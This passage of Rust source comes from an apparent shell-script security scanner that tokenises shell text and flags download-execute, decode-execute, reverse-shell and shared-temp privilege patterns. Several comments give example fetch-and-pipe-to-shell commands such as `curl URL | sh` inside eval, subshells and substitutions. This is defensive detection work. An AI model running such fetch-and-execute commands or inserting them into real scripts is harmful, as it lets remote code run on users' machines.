            open = true; // the backslash-newline is removed: join directly
            continue;
        }
        // The lexer, rather than raw bytes, decides whether a compound list
        // remains open. In particular `foo{` and an escaped `\\|` are words,
        // not group/pipeline syntax.
        let token_depth =
            tokenize(&text)
                .iter()
                .fold(0i32, |depth, token| match token.operator() {
                    Some("(" | "{" | "((") => depth + 1,
                    Some(")" | "}" | "))") => (depth - 1).max(0),
                    _ => depth,
                });
        open = in_single
            || in_double
            || in_backtick
            || token_depth > 0
            || trailing_pipeline_operator(&text);
        if open {
            // Newlines in a compound list remain statement separators; a
            // grammar-required operator continuation is whitespace instead.
            if token_depth > 0 && !trailing_pipeline_operator(&text) {
                text.push(';');
            } else {
                text.push(' ');
            }
        } else if !text.trim().is_empty() {
            let assembled = std::mem::take(&mut text);
            units.push((start_line, assembled.trim_end().to_owned()));
            in_single = false;
            in_double = false;
            in_backtick = false;
        }
    }
    if !text.trim().is_empty() {
        units.push((start_line, text.trim_end().to_owned()));
    }
    units
}

/// Remove heredoc payload lines from ordinary command scanning. A heredoc is
/// data unless its owning command is a shell interpreter; for that one case,
/// rewrite the static stdin script into an equivalent `-c` body so the normal
/// bounded shell walks can inspect code without treating `cat <<EOF` data as
/// top-level commands. Delimiters are tokenized, so quotes are removed only
/// for comparison; `<<-` accepts leading tabs on its terminator.
fn shell_source_without_heredoc_payloads(source: &str) -> String {
    let lines: Vec<&str> = source.lines().collect();
    let mut output = Vec::new();
    let mut index = 0usize;
    while index < lines.len() {
        let line = lines[index];
        let tokens = tokenize(line);
        let Some(redirection) = tokens
            .iter()
            .position(|token| matches!(token.operator(), Some("<<" | "<<-")))
        else {
            output.push(line.to_owned());
            index += 1;
            continue;
        };
        let strip_tabs = tokens[redirection].operator() == Some("<<-");
        let Some(delimiter) = tokens.get(redirection + 1).and_then(ShellToken::word) else {
            output.push(line.to_owned());
            index += 1;
            continue;
        };
        let mut body = Vec::new();
        let mut cursor = index + 1;
        while cursor < lines.len() {
            let candidate = if strip_tabs {
                lines[cursor].trim_start_matches('\t')
            } else {
                lines[cursor]
            };
            if candidate == delimiter {
                break;
            }
            body.push(lines[cursor]);
            cursor += 1;
        }
        // An unterminated heredoc is left alone: treating the rest of the
        // file as data would hide live code after malformed input.
        if cursor == lines.len() {
            output.push(line.to_owned());
            index += 1;
            continue;
        }
        let shell_owner = segment_commands(&tokens).first().is_some_and(|command| {
            interpreter_family(command) == Some(InterpreterFamily::Shell)
                && matches!(interpreter_mode(command), InterpreterMode::StdinScript)
        });
        let before = line
            .split_once("<<")
            .map(|(prefix, _)| prefix)
            .unwrap_or(line);
        if shell_owner {
            let quoted = body.join("\n").replace('\'', "'\"'\"'");
            output.push(format!("{before}-c '{quoted}'"));
        } else {
            output.push(before.trim_end().to_owned());
        }
        index = cursor + 1;
    }
    output.join("\n")
}

/// The shell consumption families over one token stream, collected without
/// duplicate (rule, semantic tag) pairs: a group's interior re-detects what
/// the outer segment already bound through its opening `(`, and repeated
/// statements on the line add no information.
fn shell_consumption_findings(
    tokens: &[ShellToken],
    number: u32,
    download_rule: &'static str,
    found: &mut Vec<ResultParts>,
    budget: &mut ShellBudget,
) {
    if !budget.spend(tokens.len()) {
        return;
    }
    let mut outcomes = Outcomes::ANY;
    for (statement, guard) in conditional_statements(tokens) {
        if statement.is_empty() {
            continue;
        }
        if !outcomes.executes(guard) {
            continue; // no path reaches it; the outcome set is unchanged
        }

        // Runtime text of every substitution this statement's live heads
        // execute — `eval`'s command substitutions and an interpreter's
        // process substitutions — re-parsed with the same command-position
        // rules.
        let consumed = consumed_substitutions(statement);

        // Download-execute: a fetch-tool command feeding an interpreter
        // through the pipeline, or heading a consumed span.
        if pipeline_fetches_to_interpreter(statement, budget)
            || consumed
                .iter()
                .any(|span| span_has_fetch_command(span, budget))
        {
            push_finding(
                found,
                parts(
                    download_rule,
                    number,
                    "download-execute",
                    Confidence::LexicalFallback,
                ),
            );
        }

        // Decode-execute: a decoder command feeding an interpreter through
        // the pipeline, or heading a consumed span.
        if pipeline_decodes_to_interpreter(statement, budget)
            || consumed
                .iter()
                .any(|span| span_executes_decoder(span, budget))
        {
            push_finding(
                found,
                parts(
                    SCRIPT_DECODE_EXECUTE_RULE,
                    number,
                    "decode-execute",
                    Confidence::LexicalFallback,
                ),
            );
        }

        for segment in pipeline_segments(statement) {
            if segment.is_empty() {
                continue;
            }
            if reverse_shell_spelling(segment) {
                push_finding(
                    found,
                    parts(
                        SCRIPT_REVERSE_SHELL_RULE,
                        number,
                        "reverse-shell",
                        Confidence::LexicalFallback,
                    ),
                );
            }
            // Shared temporary storage: the wrapper and the /tmp or
            // /dev/shm path share one command's segment (indicator),
            // or the chmod's own mode release targets one
            // (controlled). A pathname alone never proves attacker
            // control, and the indicator id is never repurposed. The
            // path is read from each command's real arguments, so a
            // quoted operand (`chmod 777 "/tmp/x"`) still binds while a
            // redirect target (`sudo true > /tmp/sudo.log`) never does.
            let shared_temp_path = segment_has_shared_temp_path(segment);
            if shared_temp_path
                && segment_commands(segment)
                    .iter()
                    .any(|command| matches!(command.head, "sudo" | "pkexec" | "doas"))
            {
                push_finding(
                    found,
                    parts(
                        SHARED_TEMP_INDICATOR_RULE,
                        number,
                        "privileged-shared-temp",
                        Confidence::LexicalFallback,
                    ),
                );
            }
            if shared_temp_path && chmod_relaxes_shared_temp(segment) {
                push_finding(
                    found,
                    parts(
                        SHARED_TEMP_CONTROLLED_RULE,
                        number,
                        "shared-temp-mode-release",
                        Confidence::LexicalFallback,
                    ),
                );
            }
        }

        // Static bodies execute with the statement: an interpreter's `-c`
        // body or an `eval` argument is real shell text, so every family
        // applies inside it too (`eval 'curl URL | sh'` and
        // `sh -c 'curl URL | sh'` run the pipeline now). Runtime-derived
        // bodies are outside the static slice.
        for segment in pipeline_segments(statement) {
            for command in segment_commands(segment) {
                let Some(body) = static_command_body(&command) else {
                    continue;
                };
                if !budget.enter() {
                    return;
                }
                shell_consumption_findings(&tokenize(&body), number, download_rule, found, budget);
                budget.leave();
            }
        }

        // A subshell or brace group executes its interior as its own
        // statement list, so the same families apply inside it instead of
        // the group's separators merely being hidden from this pass. An
        // arithmetic command evaluates its interior as an expression whose
        // words are never commands — but genuine command substitutions
        // nested in it DO execute (`(( $(curl URL | sh) + 1 ))`).
        for (kind, group) in grouped_token_ranges(statement) {
            match kind {
                GroupKind::List => {
                    if budget.enter() {
                        shell_consumption_findings(group, number, download_rule, found, budget);
                        budget.leave();
                    }
                }
                GroupKind::Arithmetic => {
                    if budget.enter() {
                        tokens_arithmetic_consumption(group, number, download_rule, found, budget);
                        budget.leave();
                    }
                }
            }
        }

        // A command or process substitution ALWAYS executes its interior —
        // only whether its resulting OUTPUT is further consumed depends on
        // the outer head (consumed_substitutions). The families therefore
        // also apply inside it directly: `payload=$(curl URL | sh)` runs
        // the pipeline now. Words inside groups are reached by the group
        // recursion above; only the statement's own depth is walked here.
        let mut depth = 0i32;
        for token in statement {
            match token {
                ShellToken::Operator(op) => match op.as_str() {
                    "(" | "{" | "((" => depth += 1,
                    ")" | "}" | "))" => depth = (depth - 1).max(0),
                    _ => {}
                },
                ShellToken::Word { substitutions, .. } if depth == 0 => {
                    for substitution in substitutions {
                        match substitution.kind {
                            SubstKind::Command | SubstKind::Process => {
                                if !budget.enter() {
                                    break;
                                }
                                shell_consumption_findings(
                                    &tokenize(&substitution.inner),
                                    number,
                                    download_rule,
                                    found,
                                    budget,
                                );
                                budget.leave();
                            }
                            SubstKind::Arithmetic => arithmetic_consumption_findings(
                                &substitution.inner,
                                number,
                                download_rule,
                                found,
                                budget,
                            ),
                        }
                    }
                }
                _ => {}
            }
        }

        outcomes = outcomes.advance(guard, statement_outcomes(statement));
    }
}

/// Consumption families inside an arithmetic expansion: the expression's
/// own words (and grouping parens) are never commands, but a genuine
/// command substitution nested in it executes during evaluation
/// (`x=$(( 1 + $(curl URL | sh | wc -c) ))`).
fn arithmetic_consumption_findings(
    expression: &str,
    number: u32,
    download_rule: &'static str,
    found: &mut Vec<ResultParts>,
    budget: &mut ShellBudget,
) {
    if !budget.spend(expression.len()) || !budget.enter() {
        return;
    }
    tokens_arithmetic_consumption(&tokenize(expression), number, download_rule, found, budget);
    budget.leave();
}

/// Consumption families for the words of an arithmetic context — an
/// expansion's interior OR an arithmetic command group's interior: the
/// words are expression operands, but a genuine command or process
/// substitution nested in them executes during evaluation. Each recursive
/// helper owns its single depth charge: command/process substitution
/// interiors enter here, nested arithmetic enters in
/// `arithmetic_consumption_findings`.
fn tokens_arithmetic_consumption(
    tokens: &[ShellToken],
    number: u32,
    download_rule: &'static str,
    found: &mut Vec<ResultParts>,
    budget: &mut ShellBudget,
) {
    for token in tokens {
        if let ShellToken::Word { substitutions, .. } = token {
            for substitution in substitutions {
                match substitution.kind {
                    SubstKind::Command | SubstKind::Process => {
                        if budget.enter() {
                            shell_consumption_findings(
                                &tokenize(&substitution.inner),
                                number,
                                download_rule,
                                found,
                                budget,
                            );
                            budget.leave();
                        }
                    }
                    SubstKind::Arithmetic => arithmetic_consumption_findings(
                        &substitution.inner,
                        number,
                        download_rule,
                        found,
                        budget,
                    ),
                }
            }
        }
    }
}

/// Push one finding unless the same rule already fired with the same
/// semantic tag on this line.
fn push_finding(found: &mut Vec<ResultParts>, finding: ResultParts) {
    if !found.iter().any(|existing| {
        existing.rule_id == finding.rule_id && existing.semantic_value == finding.semantic_value
    }) {
        found.push(finding);
    }
}

// ---------------------------------------------------------------------------
// Shell tokenisation and the command-position engine built on it.
// ---------------------------------------------------------------------------

/// A substitution's kind: command substitution (`$( … )`, backticks) expands
/// to text a command consumes, process substitution (`<( … )`, `>( … )`)
/// presents its output as a filename operand, and arithmetic expansion
/// (`$(( … ))`) evaluates variables into a number — only genuine command
/// substitutions nested inside it run anything.
#[derive(Clone, Copy, PartialEq, Eq)]
enum SubstKind {
    Command,
    Process,
    Arithmetic,
}

/// One active (non-single-quoted) substitution embedded in a word, keeping
/// the raw interior text so its command can be re-tokenised for egress and
/// consumption attribution.
#[derive(Clone)]
struct Substitution {
    kind: SubstKind,
    inner: String,
}

/// A shell token: a WORD carries its expanded runtime value (quotes removed,
/// adjacent fragments concatenated, escapes applied — so `c"ur"l` is `curl`)
/// plus any active substitutions it contains; an OPERATOR carries its literal
/// unquoted control/redirection text. Operators are recognised only when
/// unquoted, so a quoted or escaped `;`/`|`/`>` is part of a word and never
/// splits a statement or reads as a redirect.
#[derive(Clone)]
enum ShellToken {
    Word {
        value: String,
        substitutions: Vec<Substitution>,
        /// Some fragment of the word resolves only at runtime — an unquoted
        /// or double-quoted `$`/backtick expansion, or a captured
        /// substitution — so the value is not statically known text.
        dynamic: bool,
    },
    Operator(String),
}

impl ShellToken {
    fn word(&self) -> Option<&str> {
        match self {
            ShellToken::Word { value, .. } => Some(value),
            ShellToken::Operator(_) => None,
        }
    }

    fn operator(&self) -> Option<&str> {
        match self {
            ShellToken::Operator(op) => Some(op),
            ShellToken::Word { .. } => None,
        }
    }
}

/// Tokenise one line (or substitution interior) into words and unquoted
/// operators. Quotes, backslash escapes, and `$(`/`$((`/backtick/`<(`
/// substitutions are resolved here, keeping each token's runtime value
/// separate from its source syntax. `|&` is one pipeline operator, adjacent
/// `((`/`))` delimit an arithmetic command, and a lone `{`/`}` word is the
/// brace-group reserved word.
fn tokenize(input: &str) -> Vec<ShellToken> {
    let bytes = input.as_bytes();
    let mut tokens = Vec::new();
    // Close positions of arithmetic commands opened so far, innermost last:
    // `))` is only a closer while a `((` group is open.
    let mut arithmetic_closes: Vec<usize> = Vec::new();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b' ' | b'\t' => i += 1,
            b';' => {
                tokens.push(ShellToken::Operator(";".to_owned()));
                i += 1;
            }
            b'(' => {
                // Adjacent `((` with a matching `))` is an arithmetic
                // command: bash evaluates the contents as an expression and
                // an invalid expression is an error that runs nothing,
                // while a group with no `))` closes as two subshell parens
                // (`((a) && echo b)` runs `a && echo b`).
                if bytes.get(i + 1) == Some(&b'(')
                    && let Some(close) = arithmetic_command_close(bytes, i)
                {
                    arithmetic_closes.push(close);
                    tokens.push(ShellToken::Operator("((".to_owned()));
                    i += 2;
                } else {
                    tokens.push(ShellToken::Operator("(".to_owned()));
                    i += 1;
                }
            }
            b')' => {
                if arithmetic_closes.last() == Some(&i) {
                    arithmetic_closes.pop();
                    tokens.push(ShellToken::Operator("))".to_owned()));
                    i += 2;
                } else {
                    tokens.push(ShellToken::Operator(")".to_owned()));
                    i += 1;
                }
            }
            b'|' => {
                if bytes.get(i + 1) == Some(&b'|') {
                    tokens.push(ShellToken::Operator("||".to_owned()));
                    i += 2;
                } else if bytes.get(i + 1) == Some(&b'&') {
                    // Bash pipes stdout AND stderr to the next segment.
                    tokens.push(ShellToken::Operator("|&".to_owned()));
                    i += 2;
                } else {
                    tokens.push(ShellToken::Operator("|".to_owned()));
                    i += 1;
                }
            }
            b'&' => {
                if bytes.get(i + 1) == Some(&b'&') {
                    tokens.push(ShellToken::Operator("&&".to_owned()));
                    i += 2;
                } else if bytes.get(i + 1) == Some(&b'>') {
                    if bytes.get(i + 2) == Some(&b'>') {
                        tokens.push(ShellToken::Operator("&>>".to_owned()));
                        i += 3;
                    } else {
                        tokens.push(ShellToken::Operator("&>".to_owned()));
                        i += 2;
                    }
                } else {
                    tokens.push(ShellToken::Operator("&".to_owned()));
                    i += 1;
                }
            }
            _ => {
                if let Some((op, next)) = redirect_operator_at(bytes, i) {
                    tokens.push(ShellToken::Operator(op));
                    i = next;
                } else {
                    let (word, next) = read_word(input, i);
                    // A lone brace word is Bash's compound-group reserved
                    // word (`{ … ; }`); glued braces stay ordinary words
                    // (`{curl`, `${x}`, `-exec {} \;`).
                    match word {
                        ShellToken::Word { value, .. } if value == "{" || value == "}" => {
                            tokens.push(ShellToken::Operator(value));
                        }
                        other => tokens.push(other),
                    }
                    i = next;
                }
            }
        }
    }
    tokens
}

/// Close of an arithmetic command opened by the `((` at `start`: the `))`
/// pair that returns paren depth to the opening pair, honouring nesting and
/// quotes (`(( (1+2)*3 ))` closes at the end, while `((a) && echo b)` never
/// finds one and reads as two subshell parens). Returns the index of the
/// first `)` of the closing pair.
fn arithmetic_command_close(bytes: &[u8], start: usize) -> Option<usize> {
    let mut depth = 2u32;
    let mut index = start + 2;
    let mut in_string: Option<u8> = None;
    while index < bytes.len() {
        let byte = bytes[index];
        match in_string {
            Some(quote) => {
                if byte == b'\\' {
                    index += 2;
                    continue;
                }
                if byte == quote {
                    in_string = None;
                }
            }
            None => {
                if byte == b'"' || byte == b'\'' {
                    in_string = Some(byte);
                } else if byte == b'(' {
                    depth += 1;
                } else if byte == b')' {
                    if depth == 2 && bytes.get(index + 1) == Some(&b')') {
                        return Some(index);
                    }
                    if depth == 2 {
                        // A close at the opening pair's own depth unbalances
                        // the `((` — no `))` can follow (`(( 1 ) ) )`). Bash
                        // rejects the input; read it back as plain parens.
                        return None;
                    }
                    depth -= 1;
                }
            }
        }
        index += 1;
    }
    None
}

/// A redirection operator starting at `start`: optional leading fd digits,
/// then `<`/`>` with the `>>`, `<>`, `<<`, and `&` (duplication) variants. A
/// bare `<(`/`>(` (no fd digits) is a process substitution, not a redirect,
/// and is left to `read_word`.
fn redirect_operator_at(bytes: &[u8], start: usize) -> Option<(String, usize)> {
    let mut i = start;
    while i < bytes.len() && bytes[i].is_ascii_digit() {
        i += 1;
    }
    let had_digits = i > start;
    let first = *bytes.get(i)?;
    if first != b'<' && first != b'>' {
        return None;
    }
    if !had_digits && bytes.get(i + 1) == Some(&b'(') {
        return None; // process substitution: part of a word
    }
    i += 1;
    if (first == b'>' && bytes.get(i) == Some(&b'>'))
        || (first == b'<' && matches!(bytes.get(i), Some(b'>' | b'<')))
    {
        i += 1; // `>>`, `<>`, `<<`
        if first == b'<' && bytes.get(i - 1) == Some(&b'<') && bytes.get(i) == Some(&b'-') {
            i += 1; // `<<-` strips leading tabs from heredoc body lines
        }
    }
    if bytes.get(i) == Some(&b'&') {
        i += 1; // `>&` / `<&` duplication
    }
    Some((String::from_utf8_lossy(&bytes[start..i]).into_owned(), i))
}

/// Open a `$` substitution whose `(` sits at `open`: adjacent `((` is an
/// arithmetic expansion, anything else a command substitution. Returns the
/// kind, the interior text, and the index just past the closing `)`.
/// `$(( … ))` is arithmetic because bash expands the interior as an
/// expression first — a spaced `$( (cmd) )` keeps its subshell reading as a
/// command substitution.
fn dollar_substitution(input: &str, open: usize) -> Option<(SubstKind, String, usize)> {
    let (start, close) = balanced_bracket_span(input, open)?;
    let kind = if input.as_bytes().get(open + 1) == Some(&b'(') {
        SubstKind::Arithmetic
    } else {
        SubstKind::Command
    };
    Some((kind, input[start..close].to_owned(), close + 1))
}

/// Read one WORD starting at `start`, resolving quotes, backslash escapes,
/// and substitutions into a runtime value; returns the byte index just past
/// the word. A word is marked dynamic when any fragment resolves only at
/// runtime — an unquoted or double-quoted `$`/backtick expansion, or a
/// captured substitution — while single-quoted text stays literal.
fn read_word(input: &str, start: usize) -> (ShellToken, usize) {
    let bytes = input.as_bytes();
    let mut i = start;
    let mut value: Vec<u8> = Vec::new();
    let mut substitutions: Vec<Substitution> = Vec::new();
    let mut dynamic = false;
    while i < bytes.len() {
        match bytes[i] {
            b' ' | b'\t' | b';' | b'|' | b'&' | b'(' | b')' => break,
            b'<' | b'>' => {
                if bytes.get(i + 1) == Some(&b'(')
                    && let Some((open, close)) = balanced_bracket_span(input, i + 1)
                {
                    substitutions.push(Substitution {
                        kind: SubstKind::Process,
                        inner: input[open..close].to_owned(),
                    });
                    value.extend_from_slice(&bytes[i..=close]);
                    dynamic = true;
                    i = close + 1;
                    continue;
                }
                break; // a redirection operator terminates the word
            }
            b'\\' => {
                if let Some(&next) = bytes.get(i + 1) {
                    value.push(next);
                    i += 2;
                } else {
                    i += 1;
                }
            }
            b'\'' => {
                if let Some(rel) = input[i + 1..].find('\'') {
                    value.extend_from_slice(&bytes[i + 1..i + 1 + rel]);
                    i = i + 1 + rel + 1;
                } else {
                    value.extend_from_slice(&bytes[i + 1..]);
                    i = bytes.len();
                }
            }
            b'"' => {
                i = read_double_quoted(input, i + 1, &mut value, &mut substitutions, &mut dynamic)
            }
            b'$' if bytes.get(i + 1) == Some(&b'(') => {
                match dollar_substitution(input, i + 1) {
                    Some((kind, inner, end)) => {
                        substitutions.push(Substitution { kind, inner });
                        dynamic = true;
                        match kind {
                            // The expansion's runtime value is a number, so
                            // it never reads back as a command word.
                            SubstKind::Arithmetic => value.push(b'0'),
                            _ => value.extend_from_slice(&bytes[i..end]),
                        }
                        i = end;
                    }
                    None => {
                        value.push(bytes[i]);
                        dynamic = true;
                        i += 1;
                    }
                }
            }
            b'$' => {
                // A bare parameter expansion (`$body`) resolves at runtime.
                value.push(bytes[i]);
                dynamic = true;
                i += 1;
            }
            b'`' => {
                if let Some(rel) = input[i + 1..].find('`') {
                    let inner_start = i + 1;
                    let inner_end = i + 1 + rel;
                    substitutions.push(Substitution {
                        kind: SubstKind::Command,
                        inner: input[inner_start..inner_end].to_owned(),
                    });
                    value.extend_from_slice(&bytes[i..=inner_end]);
                    dynamic = true;
                    i = inner_end + 1;
                } else {
                    value.push(bytes[i]);
                    dynamic = true;
                    i += 1;
                }
            }
            other => {
                value.push(other);
                i += 1;
            }
        }
    }
    (
        ShellToken::Word {
            value: String::from_utf8_lossy(&value).into_owned(),
            substitutions,
            dynamic,
        },
        i,
    )
}

/// Continue reading inside a double-quoted region opened just before `start`:
/// backslash escapes only ``"$`\``, `$( … )`/`$(( … ))` and backticks stay
/// active substitutions, everything else is literal. Returns the index past
/// the closing quote (or end of input); any runtime-resolved fragment marks
/// the word dynamic.
fn read_double_quoted(
    input: &str,
    start: usize,
    value: &mut Vec<u8>,
    substitutions: &mut Vec<Substitution>,
    dynamic: &mut bool,
) -> usize {
    let bytes = input.as_bytes();
    let mut i = start;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => return i + 1,
            b'\\' => {
                if let Some(&next) = bytes.get(i + 1) {
                    if matches!(next, b'"' | b'$' | b'`' | b'\\') {
                        value.push(next);
                    } else {
                        value.push(b'\\');
                        value.push(next);
                    }
                    i += 2;
                } else {
                    i += 1;
                }
            }
            b'$' if bytes.get(i + 1) == Some(&b'(') => {
                match dollar_substitution(input, i + 1) {
                    Some((kind, inner, end)) => {
                        substitutions.push(Substitution { kind, inner });
                        *dynamic = true;
                        match kind {
                            // The expansion's runtime value is a number, so
                            // it never reads back as a command word.
                            SubstKind::Arithmetic => value.push(b'0'),
                            _ => value.extend_from_slice(&bytes[i..end]),
                        }
                        i = end;
                    }
                    None => {
                        value.push(bytes[i]);
                        *dynamic = true;
                        i += 1;
                    }
                }
            }
            b'$' => {
                value.push(bytes[i]);
                *dynamic = true;
                i += 1;
            }
            b'`' => {
                if let Some(rel) = input[i + 1..].find('`') {
                    let inner_start = i + 1;
                    let inner_end = i + 1 + rel;
                    substitutions.push(Substitution {
                        kind: SubstKind::Command,
                        inner: input[inner_start..inner_end].to_owned(),
                    });
                    value.extend_from_slice(&bytes[i..=inner_end]);
                    *dynamic = true;
                    i = inner_end + 1;
                } else {
                    value.push(bytes[i]);
                    *dynamic = true;
                    i += 1;
                }
            }
            other => {
                value.push(other);
                i += 1;
            }
        }
    }
    i
}

/// Statements of a token slice with the control operator that preceded each
/// one (`;`, `&&`, `||`, `&`; the first statement carries `None`), so
/// conditional lists keep their short-circuit semantics instead of every
/// statement reading as executed sequentially.
fn conditional_statements(tokens: &[ShellToken]) -> Vec<(&[ShellToken], Option<&str>)> {
    let mut statements = Vec::new();
    let mut start = 0usize;
    let mut guard: Option<&str> = None;
    let mut depth = 0i32;
    for (index, token) in tokens.iter().enumerate() {
        if let Some(op) = token.operator() {
            match op {
                "(" | "{" | "((" => depth += 1,
                ")" | "}" | "))" => depth = (depth - 1).max(0),
                ";" | "&&" | "||" | "&" if depth == 0 => {
                    statements.push((&tokens[start..index], guard));
                    guard = Some(op);
                    start = index + 1;
                }
                _ => {}
            }
        }
    }
    statements.push((&tokens[start..], guard));
    statements
}

/// Exit-status model for conditional lists as the SET of statuses the
/// preceding list may still end with. Only `true`/`:` and `false` are known;
/// every other command contributes BOTH, so each following guard stays
/// executable on the paths where it applies. A guarded statement that runs
/// replaces the executed paths' statuses with its own while skipped paths
/// keep theirs — `printf ok || false && curl …` still reaches the fetch on
/// the printf-success path even though the `false` path never does.
#[derive(Clone, Copy)]
struct Outcomes {
    success: bool,
    failure: bool,
}

impl Outcomes {
    /// Before any statement every path is live, so both statuses are
    /// possible (the first statement's guard is always unconditional).
    const ANY: Self = Self {
        success: true,
        failure: true,
    };

    /// Whether a statement runs given the operator before it and the
    /// modelled outcomes of the previous statement.
    fn executes(self, guard: Option<&str>) -> bool {
        match guard {
            None | Some(";") | Some("&") => true,
            Some("&&") => self.success,
            Some("||") => self.failure,
            _ => true,
        }
    }

    /// The outcomes AFTER one guarded statement: executed paths take the
    /// statement's own statuses, skipped paths keep the previous ones.
    fn advance(self, guard: Option<&str>, statement: Self) -> Self {
        match guard {
            Some("&&") => Self {
                success: self.success && statement.success,
                failure: (self.success && statement.failure) || self.failure,
            },
            Some("||") => Self {
                success: (self.failure && statement.success) || self.success,
                failure: self.failure && statement.failure,
            },
            _ => statement,
        }
    }
}

/// The outcomes a statement contributes to the following guards: its
/// pipeline's LAST command decides the exit status (`false | true`
/// succeeds), and a leading `!` negation inverts a known status
/// (`! true` fails, `! false` succeeds).
fn statement_outcomes(statement: &[ShellToken]) -> Outcomes {
    let segment = pipeline_segments(statement)
        .last()
        .copied()
        .unwrap_or(statement);
    let (success, failure) = match segment_commands(segment)
        .first()
        .map(|command| command.head)
    {
        Some("true") | Some(":") => (true, false),
        Some("false") => (false, true),
        _ => (true, true),
    };
    if pipeline_negated(statement) {
        Outcomes {
            success: failure,
            failure: success,
        }
    } else {
        Outcomes { success, failure }
    }
}

/// Whether the statement negates its pipeline with the `!` reserved word —
/// `!` opens a pipeline, so nothing can precede it, and `! ! cmd` negates
/// twice.
fn pipeline_negated(statement: &[ShellToken]) -> bool {
    let mut negations = 0usize;
    for token in statement {
        match token {
            ShellToken::Word { value, .. } if value == "!" => negations += 1,
            _ => break,
        }
    }
    negations % 2 == 1
}

/// Split a statement into pipeline segments on `|` and Bash's `|&` (which
/// pipes stdout AND stderr) at subshell depth zero.
fn pipeline_segments(tokens: &[ShellToken]) -> Vec<&[ShellToken]> {
    split_token_stream(tokens, |op| op == "|" || op == "|&")
}

fn split_token_stream(
    tokens: &[ShellToken],
    is_separator: impl Fn(&str) -> bool,
) -> Vec<&[ShellToken]> {
    let mut segments = Vec::new();
    let mut start = 0usize;
    let mut depth = 0i32;
    for (index, token) in tokens.iter().enumerate() {
        if let Some(op) = token.operator() {
            match op {
                "(" | "{" | "((" => depth += 1,
                ")" | "}" | "))" => depth = (depth - 1).max(0),
                _ if depth == 0 && is_separator(op) => {
                    segments.push(&tokens[start..index]);
                    start = index + 1;
                }
                _ => {}
            }
        }
    }
    segments.push(&tokens[start..]);
    segments
}

/// Kind of a compound group's interior: `(`/`{` wrap a command list the
/// subshell runs, `((` wraps an arithmetic expression whose words are
/// variables and never commands.
#[derive(Clone, Copy, PartialEq, Eq)]
enum GroupKind {
    List,
    Arithmetic,
}

/// Token index of the closer matching the group opener at `open_index`,
/// counting any opener/closer pair as one nesting level (mirroring
/// `split_token_stream`). `None` when the group never closes.
fn matching_group_close(tokens: &[ShellToken], open_index: usize) -> Option<usize> {
    let mut depth = 1i32;
    for (offset, token) in tokens[open_index + 1..].iter().enumerate() {
        match token.operator() {
            Some("(" | "{" | "((") => depth += 1,
            Some(")" | "}" | "))") => {
                depth -= 1;
                if depth == 0 {
                    return Some(open_index + 1 + offset);
                }
            }
            _ => {}
        }
    }
    None
}

/// Top-level compound groups of a token slice, left to right and
/// non-overlapping: subshell and brace groups hold a command list the shell
/// runs, an arithmetic command holds an expression. Nested groups are NOT
/// returned here — the caller recurses into the returned interiors, which
/// re-discovers them, so descendants are analyzed once instead of once per
/// enclosing ancestor, and nothing nested inside an arithmetic group is ever
/// surfaced as a command list (`(( (curl URL | sh) ))` runs nothing).
fn grouped_token_ranges(tokens: &[ShellToken]) -> Vec<(GroupKind, &[ShellToken])> {
    let mut groups = Vec::new();
    let mut index = 0usize;
    while index < tokens.len() {
        let kind = match tokens[index].operator() {
            Some("(" | "{") => GroupKind::List,
            Some("((") => GroupKind::Arithmetic,
            _ => {
                index += 1;
                continue;
            }
        };
        match matching_group_close(tokens, index) {
            Some(close) => {
                groups.push((kind, &tokens[index + 1..close]));
                index = close + 1;
            }
            None => index += 1, // unmatched opener: keep scanning past it
        }
    }
    groups
}

/// Recursion and work budget for analyzing untrusted shell text: bounds how
/// deep compound-group and substitution recursion may descend and how many
/// tokens (or characters, for re-tokenised substitution text) the whole
/// analysis may visit, so adversarial nesting degrades to a disclosed
/// coverage limitation instead of unbounded recursion.
const MAX_SHELL_ANALYSIS_DEPTH: u32 = 64;
const MAX_SHELL_ANALYSIS_NODES: u32 = 250_000;

struct ShellBudget {
    depth: u32,
    nodes: u32,
    exhausted: bool,
}

impl ShellBudget {
    fn new() -> Self {
        Self {
            depth: MAX_SHELL_ANALYSIS_DEPTH,
            nodes: MAX_SHELL_ANALYSIS_NODES,
            exhausted: false,
        }
    }

    /// Charge one analysis step for the tokens it walks; past the budget the
    /// step is refused and the budget stays exhausted for the rest of the
    /// pass, so callers report the shortfall instead of recursing without
    /// bound.
    fn spend(&mut self, tokens: usize) -> bool {
        if self.exhausted {
            return false;
        }
        let charge = tokens.min(u32::MAX as usize) as u32;
        if charge > self.nodes {
            self.nodes = 0;
            self.exhausted = true;
            return false;
        }
        self.nodes -= charge;
        true
    }

    /// Descend one recursion level; `false` refuses the descent (and marks
    /// the budget exhausted) at the depth ceiling.
    fn enter(&mut self) -> bool {
        if self.exhausted || self.depth == 0 {
            self.exhausted = true;
            return false;
        }
        self.depth -= 1;
        true
    }

    fn leave(&mut self) {
        self.depth = self.depth.saturating_add(1).min(MAX_SHELL_ANALYSIS_DEPTH);
    }

    fn exhausted(&self) -> bool {
        self.exhausted
    }
}

/// One command in command position inside a pipeline segment, with its
/// argument word values.
struct ScriptCommand<'a> {
    head: &'a str,
    args: Vec<&'a str>,
    /// Per-argument runtime-derivation flag parallel to `args`: an argument
    /// word carrying a substitution or an unquoted expansion resolves to
    /// text unknown until execution, so it is no static body candidate.
    arg_dynamic: Vec<bool>,
}

/// Commands in command position within one pipeline segment: the head word
/// (after `VAR=value` prefixes, leading redirections, `!` negation, and a
/// subshell/brace open), unwrapped through execution and privilege wrappers
/// (`sudo -u root chmod …`, `env curl …`, `exec curl …`, `time curl …` yield
/// the wrapper AND its wrapped command). Only a wrapper in command position
/// is unwrapped — wrapper words inside another command's argv
/// (`echo sudo chmod 777 /tmp/x`) remain operands.
fn segment_commands(segment: &[ShellToken]) -> Vec<ScriptCommand<'_>> {
    let mut commands = Vec::new();
    let mut index = 0usize;
    loop {
        skip_command_prefixes(segment, &mut index);
        let Some(head) = segment.get(index).and_then(ShellToken::word) else {
            break;
        };
        let basename = command_basename(head);
        let arguments = command_arguments(segment, index + 1);
        commands.push(ScriptCommand {
            head: basename,
            args: arguments.iter().map(|(value, _)| *value).collect(),
            arg_dynamic: arguments.iter().map(|(_, dynamic)| *dynamic).collect(),
        });
        if !matches!(
            basename,
            "sudo" | "pkexec" | "doas" | "command" | "env" | "exec" | "time"
        ) {
            break;
        }
        index += 1;
        // `env -S 'curl URL'` embeds the wrapped command as a word-split
        // string: record its head as a command of its own.
        if basename == "env"
            && let Some(script) = env_split_string_command(segment, index)
        {
            commands.push(script);
            break;
        }
